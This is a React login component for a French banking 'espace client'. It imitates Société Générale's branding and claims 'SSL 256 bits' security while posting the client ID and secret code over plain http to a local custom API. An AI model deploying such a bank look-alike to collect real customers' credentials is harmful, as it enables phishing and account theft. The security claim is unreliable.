import { useState } from 'react';

const API_URL = 'http://localhost:5000/api/auth/login';

export default function LoginPage({ initialIdentifier = '', onLoginSuccess }) {
  const [identifierClient, setIdentifierClient] = useState(initialIdentifier || '5418759624');
  const [secretCode, setSecretCode] = useState('');
  const [showSecret, setShowSecret] = useState(false);
  const [rememberId, setRememberId] = useState(Boolean(initialIdentifier));
  const [message, setMessage] = useState('');
  const [status, setStatus] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (event) => {
    event.preventDefault();
    setLoading(true);
    setMessage('');
    setStatus('');

    try {
      const response = await fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ identifierClient, secretCode, rememberId })
      });

      const data = await response.json();

      if (!response.ok) {
        setStatus('error');
        setMessage(data.message || 'Erreur de connexion.');
      } else {
        setStatus('success');
        setMessage(data.message || 'Connexion réussie.');
        if (onLoginSuccess) {
          onLoginSuccess(data.token, rememberId, identifierClient);
        }
      }
    } catch (error) {
      setStatus('error');
      setMessage('Impossible de joindre le serveur.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="page-shell">
      <div className="login-card">
        <div className="brand-row">
          <div className="sg-logo">
            <div className="sg-block sg-block-black" />
            <div className="sg-block sg-block-red" />
          </div>
          <div>
            <h1>Votre espace client</h1>
            <p>Connectez-vous pour accéder à votre compte.</p>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="login-form">
          <label>
            Identifiant client
            <input
              type="text"
              value={identifierClient}
              onChange={(e) => setIdentifierClient(e.target.value)}
              inputMode="numeric"
              pattern="[0-9]*"
              placeholder="5418759624"
              required
            />
          </label>

          <label>
            Code secret
            <div className="password-field">
              <input
                type={showSecret ? 'text' : 'password'}
                value={secretCode}
                onChange={(e) => setSecretCode(e.target.value)}
                placeholder="Entrez votre code secret"
                required
              />
              <button
                type="button"
                className="eye-button"
                onClick={() => setShowSecret((current) => !current)}
                aria-label={showSecret ? 'Masquer le code secret' : 'Afficher le code secret'}
              >
                {showSecret ? '🙈' : '👁️'}
              </button>
            </div>
          </label>

          <div className="options-row">
            <label className="remember-label">
              <input
                type="checkbox"
                checked={rememberId}
                onChange={(e) => setRememberId(e.target.checked)}
              />
              Mémoriser mon ID
            </label>

            <button type="button" className="link-button">
              Code oublié ?
            </button>
          </div>

          <button type="submit" className="submit-button" disabled={loading}>
            {loading ? 'Connexion...' : 'Se connecter'}
          </button>

          {message && (
            <p className={`message ${status === 'success' ? 'message-success' : 'message-error'}`}>
              {message}
            </p>
          )}
        </form>

        <div className="legal-note">
          <p>Connexion sécurisée SSL 256 bits</p>
          <p>Société Générale - Tous droits réservés</p>
        </div>
      </div>
    </div>
  );
}
